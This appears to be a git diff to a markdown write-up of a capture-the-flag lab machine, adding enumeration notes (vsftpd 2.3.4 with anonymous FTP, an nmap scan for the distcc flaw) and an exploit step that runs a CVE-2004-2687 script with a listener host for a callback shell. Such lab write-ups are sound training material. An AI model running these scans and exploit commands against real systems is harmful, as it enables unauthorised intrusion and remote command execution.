@@ -82,6 +82,8 @@ Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
 
 ---
 
+# Enumeration
+
 ## Port 21 - FTP
   - Service and Version:`vsftpd 2.3.4`
   - Anonymous login is allowed.
@@ -141,3 +143,15 @@ Nmap done: 1 IP address (1 host up) scanned in 53.82 seconds
 ▶ nmap -Pn -p 3632 10.10.10.3 --script distcc-cve2004-2687.nse
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236667868-56a68f3d-9a51-412f-b315-9b62fb71ec49.png)
+
+---
+
+# Exploit
+
+## DistCC Daemon Command Execution
+  - Exploit 
+
+```CSS
+▶ python CVE-2004-2687-Exploit.py --rhost 10.10.10.3 --lhost 10.10.14.24
+```
+![image](https://user-images.githubusercontent.com/83878909/236668409-86d65ad4-c6b0-44ef-b69c-42948fb7a440.png)
